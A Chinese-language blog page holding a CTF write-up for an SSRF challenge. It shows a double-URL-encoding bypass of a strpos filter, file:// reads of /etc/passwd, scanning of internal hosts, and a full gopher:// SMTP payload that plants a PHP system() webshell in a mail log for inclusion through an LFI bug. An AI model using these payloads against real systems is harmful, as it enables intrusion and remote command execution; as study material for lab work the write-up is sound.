@@ -1,0 +1,1641 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">
+
+<link rel="stylesheet" href="/css/main.css?v=7.0.1">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/米兔.jpg?v=7.0.1">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico?v=7.0.1">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon16x16.ico?v=7.0.1">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=7.0.1" color="#222">
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.0.1',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
+    back2top: true,
+    back2top_sidebar: true,
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":true,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="6月安恒杯月赛里的web2是道SSRF题，赛后复现感觉学到的东西挺多的，特此记录下。">
+<meta name="keywords" content="SSRF,CTF,安恒杯">
+<meta property="og:type" content="article">
+<meta property="og:title" content="一道SSRF题">
+<meta property="og:url" content="http://miracle778.github.io/Web安全/SSRF/一道SSRF题.html">
+<meta property="og:site_name" content="Miracle778&#39;s Blog">
+<meta property="og:description" content="6月安恒杯月赛里的web2是道SSRF题，赛后复现感觉学到的东西挺多的，特此记录下。">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://miracle778.github.io/Web安全/SSRF//一道SSRF题//1.jpg">
+<meta property="og:image" content="http://miracle778.github.io/Web安全/SSRF//一道SSRF题//2.png">
+<meta property="og:image" content="http://miracle778.github.io/Web安全/SSRF//一道SSRF题//3.jpg">
+<meta property="og:image" content="http://miracle778.github.io/Web安全/SSRF//一道SSRF题//4.jpg">
+<meta property="og:image" content="http://miracle778.github.io/Web安全/SSRF//一道SSRF题//5.jpg">
+<meta property="og:image" content="http://miracle778.github.io/Web安全/SSRF//一道SSRF题//6.jpg">
+<meta property="og:image" content="http://miracle778.github.io/Web安全/SSRF//一道SSRF题//7.jpg">
+<meta property="og:image" content="http://miracle778.github.io/Web安全/SSRF//一道SSRF题//8.jpg">
+<meta property="og:image" content="http://miracle778.github.io/Web安全/SSRF//一道SSRF题//9.jpg">
+<meta property="og:image" content="http://miracle778.github.io/Web安全/SSRF//一道SSRF题//10.jpg">
+<meta property="og:image" content="http://miracle778.github.io/Web安全/SSRF//一道SSRF题//11.png">
+<meta property="og:image" content="http://miracle778.github.io/Web安全/SSRF//一道SSRF题//12.jpg">
+<meta property="og:image" content="http://miracle778.github.io/Web安全/SSRF//一道SSRF题//13.jpg">
+<meta property="og:image" content="http://miracle778.github.io/Web安全/SSRF//一道SSRF题//14.jpg">
+<meta property="og:image" content="http://miracle778.github.io/Web安全/SSRF//一道SSRF题//15.jpg">
+<meta property="og:image" content="http://miracle778.github.io/Web安全/SSRF//一道SSRF题//16.jpg">
+<meta property="og:image" content="http://miracle778.github.io/Web安全/SSRF//一道SSRF题//17.jpg">
+<meta property="og:updated_time" content="2019-07-04T10:22:13.396Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="一道SSRF题">
+<meta name="twitter:description" content="6月安恒杯月赛里的web2是道SSRF题，赛后复现感觉学到的东西挺多的，特此记录下。">
+<meta name="twitter:image" content="http://miracle778.github.io/Web安全/SSRF//一道SSRF题//1.jpg">
+
+
+
+
+
+
+  <link rel="canonical" href="http://miracle778.github.io/Web安全/SSRF/一道SSRF题.html">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>一道SSRF题 | Miracle778's Blog</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Miracle778's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">人生本来就有很多事是徒劳无功呀!</p>
+      
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>Tags</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>Categories</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-info-circle"></i> <br>About</a>
+
+  </li>
+
+      
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>Search</a>
+        </li>
+      
+    </ul>
+  
+
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://miracle778.github.io/Web安全/SSRF/一道SSRF题.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Miracle778">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/米兔.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Miracle778's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">一道SSRF题
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-07-04 13:42:44 / 修改时间：18:22:13" itemprop="dateCreated datePublished" datetime="2019-07-04T13:42:44+08:00">2019-07-04</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Web安全/" itemprop="url" rel="index"><span itemprop="name">Web安全</span></a></span>
+
+                
+                
+                  ，
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Web安全/SSRF/" itemprop="url" rel="index"><span itemprop="name">SSRF</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+              
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+            
+                <span class="post-meta-item-text">评论数：</span>
+                <a href="/Web安全/SSRF/一道SSRF题.html#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/Web安全/SSRF/一道SSRF题.html" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="post-meta-item-icon">
+            <i class="fa fa-eye"></i>
+             阅读次数： 
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+            </span>
+          
+
+          
+            <div class="post-symbolscount">
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">本文字数：</span>
+                
+                <span title="本文字数">4.4k</span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">4 分钟</span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p style="text-indent:27px;">6月安恒杯月赛里的web2是道SSRF题，赛后复现感觉学到的东西挺多的，特此记录下。</p>
+
+
+<a id="more"></a>
+<hr>
+<h1 id="先说说自己当时做的过程"><a href="#先说说自己当时做的过程" class="headerlink" title="先说说自己当时做的过程"></a>先说说自己当时做的过程</h1><p>题目点进去后，看到几行php源码，可以看到几个和<code>curl</code>相关的函数，上网搜搜能发现，这应该是个SSRF题。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$x = $_GET[<span class="string">'x'</span>];</span><br><span class="line">$pos = strpos($x,<span class="string">"php"</span>);</span><br><span class="line"><span class="keyword">if</span>($pos)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">"denied"</span>);</span><br><span class="line">&#125;</span><br><span class="line">$ch = curl_init();</span><br><span class="line">curl_setopt($ch,CURLOPT_URL,<span class="string">"$x"</span>);</span><br><span class="line">curl_setopt($ch,CURLOPT_RETURNTRANSFER,<span class="keyword">true</span>);</span><br><span class="line">$result = curl_exec($ch);</span><br><span class="line"><span class="keyword">echo</span> $result;</span><br></pre></td></tr></table></figure></p>
+<p>通过输入<code>x</code>，控制<code>curl</code>会话选项，使其访问内网资源，然后输出访问结果。</p>
+<blockquote>
+<p>x可利用的协议有gopher、dict、http、https、file等<br>file协议可以用于查看文件<br>dict协议可以用于刺探端口<br><strong>gopher</strong>协议支持GET&amp;POST请求，常用于攻击内网ftp、redis、telnet、smtp等服务，还可以利用gopher协议访问redis反弹shell</p>
+</blockquote>
+<p>知道这个之后，就可以对<code>x</code>进行利用尝试了。上面提到了，主要可以利用<code>file、dict、gopher、http(s)</code>等协议。<br>于是我们先用<code>file</code>文件试试任意文件读取，首先读下<code>/etc/passwd</code>文件，发现读取成功。<br><img src="/Web安全/SSRF/\一道SSRF题\\1.jpg" alt><br>然后就想着读读<code>index.php</code>文件试试，但是这里代码里有一行<code>strpos($x,&#39;php&#39;)</code>对输入的<code>x</code>做了限制。之前遇到的代码审计题里面关于<code>strpos</code>函数的都是把<code>strpos</code>查找的字符串放在开头，使<code>strpos</code>函数返回为0，从而绕过<code>strpos() == false</code>。但是这里明显不是利用这个点，因为<code>curl</code>并不支持<code>php</code>协议<br><img src="/Web安全/SSRF/\一道SSRF题\\2.png" alt></p>
+<p>于是只好上网搜搜<code>strpos</code>函数有没有别的bug或绕过方法。但找了找，发现找来找去都只是一些老知识，只怪自己知识储备不够，搜索引擎都用不好(2333~)</p>
+<p>于是读<code>*.php</code>这条路被堵死了，只能用<code>file</code>协议随便试试其他文件，试了<code>~/.bash_history</code>等一些别的文件，但是效果都不大，于是就只能作罢了。</p>
+<hr>
+<h1 id="然后开始复现"><a href="#然后开始复现" class="headerlink" title="然后开始复现"></a>然后开始复现</h1><p>赛后，安恒官方发布了wp和复现环境，看完wp之后，恍然大悟，于是开始复现。<br>首先是<code>strpos</code>函数这个点，这里是利用了php的一个bug，具体可以上: <code>https://bugs.php.net/bug.php?id=76671&amp;edit=1</code>查看详情。</p>
+<blockquote>
+<p>这个bug是说，如果向strpos传入一个双重url编码的字符串，可以达到绕过的目的<br>比如我们这里可以使x=%2570，就可以绕过strpos($x,”php”)<br>(%25是%的url编码,%70是p的url编码)</p>
+</blockquote>
+<p>于是我们就可以绕过<code>strpos</code>函数的限制了， 也就是说<code>x</code>变量可以随便输入字符串了。</p>
+<p>于是我们可以接着用<code>file</code>协议读取<code>/var/www/html/</code>文件下的网页源码，先读读<code>index.php</code>看看起不起作用。<br>payload:<code>http://101.71.29.5:10012/?x=file:///var/www/html/index.ph%2570</code><br><img src="/Web安全/SSRF/\一道SSRF题\\3.jpg" alt><br>在注释里找到了<code>index.php</code>的代码，说明我们这样是可以读取成功的，但读<code>index.php</code>对我们帮助并不大，那我们接下来该读什么呢?</p>
+<p>只能继续读<code>/var/www/html/</code>文件下的其他文件，但是我们并不知道其他文件的文件名。所以在这之前，还需用字典扫扫该站点的其他文件。</p>
+<p>我这里用的是御剑加自定义字典扫的，截图如下。<br><img src="/Web安全/SSRF/\一道SSRF题\\4.jpg" alt></p>
+<p>可以看到，还有一个<code>flag.php</code>，于是继续读取<code>flag.php</code>文件<br><img src="/Web安全/SSRF/\一道SSRF题\\5.jpg" alt></p>
+<p>于是按照提示继续访问<code>/etc/hosts</code>文件<br><img src="/Web安全/SSRF/\一道SSRF题\\6.jpg" alt></p>
+<p>然后找到内网IP<code>172.18.0.3</code>，那得到这个内网IP有啥用呢，其实那天我自己做的时候，找到了这个IP，但不知道咋用。看了wp后，突然就悟出来了。下面说说自己的理解。</p>
+<blockquote>
+<p>很明显这题考的是SSRF,SSRF不就是用来搞内网的么，利用服务器去打外网访问不到的内网其他主机。</p>
+</blockquote>
+<p>这里知道了内网IP的格式，于是就可以利用<code>curl</code>的<code>http</code>协议，刺探内网其他主机<code>172.18.0.*</code><br><img src="/Web安全/SSRF/\一道SSRF题\\7.jpg" alt></p>
+<p>可以看到，就<code>172.18.0.1|2|3</code>能够访问。分别查看这三个IP的返回结果，发现<code>http://101.71.29.5:10012/?x=http://172.18.0.2</code>的返回结果如下图，存在LFI漏洞。<br><img src="/Web安全/SSRF/\一道SSRF题\\8.jpg" alt></p>
+<p>这只是<code>80</code>端口的结果，接下来我们看看其他端口的开放情况，可以看到，25端口也开放了，25对应的就是smtp服务。<br><img src="/Web安全/SSRF/\一道SSRF题\\9.jpg" alt></p>
+<p>于是可以联想到利用<code>gopher</code>协议打smtp，然后再结合之前发现的LFI漏洞，得出这样的思路</p>
+<blockquote>
+<p>利用gopher打smtp，在日志文件中留下一句话木马，然后用LFI包含日志文件获取webshell</p>
+</blockquote>
+<p>思路清晰了后，就开始执行了，先用<code>gopherus</code>脚本生成payload，gopherus地址:<a href="https://github.com/tarunkant/Gopherus" target="_blank" rel="noopener">https://github.com/tarunkant/Gopherus</a>，里面有详细用法。</p>
+<p><img src="/Web安全/SSRF/\一道SSRF题\\10.jpg" alt></p>
+<p>把生成的payload复制下来，然后改下IP，改成172.18.0.2<br><code>gopher://172.18.0.2:25/_MAIL%20FROM:%3Cmiracle%40778.com%3E%0ARCPT%20To:%3C%3F%20system%28%24_GET%5B%27miracle%27%5D%29%3B%20%3F%3E%0ADATA%0AFrom:%3Cmiracle%40778.com%3E%0ASubject:test%0AMessage:test%0A.</code><br>然后进行url编码<br><img src="/Web安全/SSRF/\一道SSRF题\\11.png" alt></p>
+<p>得到最终payload:<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%67%6f%70%68%65%72%3a%2f%2f%31%37%32%2e%31%38%2e%30%2e%32%3a%32%35%2f%5f%4d%41%49%4c%25%32%30%46%52%4f%4d%3a%25%33%43%6d%69%72%61%63%6c%65%25%34%30%37%37%38%2e%63%6f%6d%25%33%45%25%30%41%52%43%50%54%25%32%30%54%6f%3a%25%33%43%25%33%46%25%32%30%73%79%73%74%65%6d%25%32%38%25%32%34%5f%47%45%54%25%35%42%25%32%37%6d%69%72%61%63%6c%65%25%32%37%25%35%44%25%32%39%25%33%42%25%32%30%25%33%46%25%33%45%25%30%41%44%41%54%41%25%30%41%46%72%6f%6d%3a%25%33%43%6d%69%72%61%63%6c%65%25%34%30%37%37%38%2e%63%6f%6d%25%33%45%25%30%41%53%75%62%6a%65%63%74%3a%74%65%73%74%25%30%41%4d%65%73%73%61%67%65%3a%74%65%73%74%25%30%41%2e</span><br></pre></td></tr></table></figure></p>
+<p>然后利用这个payload，污染日志文件，可以看到，我们的payload利用gopher协议尝试用smtp发送邮件，当然因为我们的地址填的是一句话木马，所以这里肯定发送失败，不过却会在日志文件中留下记录。<br><img src="/Web安全/SSRF/\一道SSRF题\\12.jpg" alt></p>
+<p>于是我们现在可以去找smtp的日志文件位置了，一般来讲linux中的邮件日志文件路径为</p>
+<blockquote>
+<p>/var/log/maillog<br>/var/log/mail.log<br>/var/adm/maillog<br>/var/adm/syslog/mail.log</p>
+</blockquote>
+<p>我们这里可以利用前面的LFI，利用<code>php://filter</code>协议，查看上面四个日志文件路径，看看哪个有输出。最后发现，日志文件路径是<code>/var/log/mail.log</code><br><img src="/Web安全/SSRF/\一道SSRF题\\13.jpg" alt></p>
+<p>把内容解密一下，看到<code>/var/log/mail.log</code>内容如下图<br><img src="/Web安全/SSRF/\一道SSRF题\\14.jpg" alt><br>咦，跟我们<code>gopher</code>打的不一样。。不过里面依然有个一句话木马，可以先试试。结果发现，输入命令不管用。<br><img src="/Web安全/SSRF/\一道SSRF题\\15.jpg" alt><br>后面发现，原来是这个题目环境出了问题。</p>
+<p>按道理，接下来要做的是传入<code>cmd</code>给webshell，利用<code>ls cat</code>找到<code>flag</code>，但这里题目环境出错了，所以只能作罢。</p>
+<p>不过看wp可以知道，最后<code>flag</code>文件在根目录下的<code>Th7s_Is_Flag</code>文件里面，于是我们可以利用<code>LFI</code>读一下这个文件<br><img src="/Web安全/SSRF/\一道SSRF题\\16.jpg" alt><br>然后解密下，也算得到flag了吧<code>flag{dcbd1fa555331261ed1bfd21c3dd889f}</code></p>
+<hr>
+<h1 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h1><p>由于是第一次做SSRF这类题，这次复现也学到挺多东西的。</p>
+<ol>
+<li><p>strpos函数bug，我做的时候用google搜过，关键词是<code>php strpos CTF</code>,结果搜到的全是一些没什么用的，相同的东西，那么如何有效利用搜索引擎呢?</p>
+<blockquote>
+<p>这里给出了php官方bug的一个网址，<a href="https://bugs.php.net" target="_blank" rel="noopener">https://bugs.php.net</a><br>我们可以利用google搜索语法进行搜索<br>比如这里我们可以用: site: <a href="https://bugs.php.net" target="_blank" rel="noopener">https://bugs.php.net</a> strpos<br>可以快速找到相关漏洞<br><img src="/Web安全/SSRF/\一道SSRF题\\17.jpg" alt></p>
+</blockquote>
+</li>
+<li><p>为什么一开始要利用file协议读取flag.php，不能直接读/etc/hosts吗？</p>
+<blockquote>
+<p>这里我也想过，得出结论是<br>一开始我们只知道这是个跟curl函数相关的题，而curl可以利用file、http、gopher等许多协议，我们并不知道flag位置是在该服务器上，还是内网其他服务器上。<br>所以我们只能一个个试，先假设该题目flag在本地服务器这个，自然想到要读/var/www/html目录下的文件，这里也要说明下，官方wp里面是直接给出flag.php这个文件来了，其实按道理应该是要自己扫一下，然后再读。<br>找到了flag.php文件，然后该文件提示flag在/etc/hosts文件里，然后再继续读/etc/hosts文件，文件里没有明显的flag，只有内网IP。<br>也就是说，flag在内网其他服务器上，然后再进行下一步操作。</p>
+</blockquote>
+</li>
+<li><p>找到内网IP后，该怎么做?</p>
+<blockquote>
+<p>既然是ssrf，那自然是要通过服务器打外网不能访问的内网服务器，所以我们要探测内网其他服务器，以及其开放的端口。</p>
+</blockquote>
+</li>
+</ol>
+<hr>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://wooyun.js.org/drops/SSRF%20libcurl%20protocol%20wrappers%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90.html" target="_blank" rel="noopener">https://wooyun.js.org/drops/SSRF%20libcurl%20protocol%20wrappers%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90.html</a></p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>ヾﾉ≧∀≦)o 来呀！快活呀！~</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById(&quot;QR&quot;); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechatpay.jpg" alt="Miracle778 微信支付">
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/alipay.jpg" alt="Miracle778 支付宝">
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/SSRF/" rel="tag"><i class="fa fa-tag"></i> SSRF</a>
+          
+            <a href="/tags/CTF/" rel="tag"><i class="fa fa-tag"></i> CTF</a>
+          
+            <a href="/tags/安恒杯/" rel="tag"><i class="fa fa-tag"></i> 安恒杯</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/Study/Docker/Docker修炼之旅（二）.html" rel="next" title="Docker修炼之旅（二）">
+                <i class="fa fa-chevron-left"></i> Docker修炼之旅（二）
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  <div>
+    
+    <div>
+    
+    <div style="text-align:center;color: #000;font-size:17px; font-family:STLiti;">
+	-------- 本文结束 --------
+	</div>
+<div style="border: 1px solid black">
+<div style="margin-left:10px">
+<p style="font-size: 10px;line-height: 30px"><a href="https://miracle778.github.io" style="color:#258FC6">Miracle's Blog</a> by <a href="https://miracle778.github.io" style="color:#258FC6">Miracle778</a> is licensed under a <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" style="color:#258FC6">Creative Commons BY-NC-ND 4.0 International License</a>.
+<br>
+由<a href="https://miracle778.github.io" style="color:#258FC6">Miracle778</a>创作并维护的<a href="https://miracle778.github.io" style="color:#258FC6">Miracle778's Blog</a>博客采用<a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" style="color:#258FC6">创作共用保留署名-非商业-禁止演绎4.0国际许可证</a>。<br>
+本文首发于<a href="https://miracle.github.io" style="color:#258FC6">Miracle's Blog</a> 博客（ <a href="https://miracle778.github.io" style="color:#258FC6">https://miracle778.github.io</a> ），版权所有，侵权必究。</p>
+</div>
+</div>
+    
+</div>
+
+    
+ </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+
+  
+    <div class="comments" id="comments">
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/米兔.jpg" alt="Miracle778">
+            
+              <p class="site-author-name" itemprop="name">Miracle778</p>
+              <div class="site-description motion-element" itemprop="description"></div>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">26</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  
+                    
+                      <a href="/categories/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">29</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  
+                    
+                      <a href="/tags/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">44</span>
+                    <span class="site-state-item-name">标签</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://github.com/Miracle778" title="GitHub &rarr; https://github.com/Miracle778" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="mailto:Yiitao@163.com" title="E-Mail &rarr; mailto:Yiitao@163.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                </span>
+              
+            </div>
+          
+
